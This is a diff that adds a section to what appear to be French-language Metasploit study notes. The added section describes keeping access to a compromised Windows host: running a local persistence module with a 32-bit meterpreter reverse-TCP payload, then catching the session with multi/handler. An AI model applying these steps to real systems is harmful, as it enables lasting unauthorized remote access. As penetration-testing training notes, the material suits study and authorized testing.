@@ -170,5 +170,8 @@ Il est possible de générer un script à partir des commandes lancées précéd
 `makerc ~/Desktop/test.rc` : il va intégrer les commandes dans le bon ordre.  
 
 
-
+## Persistance sur Windows
+`exploit/local/persitance_service` : lui mettre la session souhaitée. Rentrer un payload en 32bits (windows/meterpreter/revers_tcp). une persistence est donc créée.    
+(`session -K` pour tuer toutes les sessions)  
+`use multi/handler`, mettre un meterpret en x86, et le LPORT et LHOST sont important à garder identiques pour récupérer un meterpreter persistant.    
 
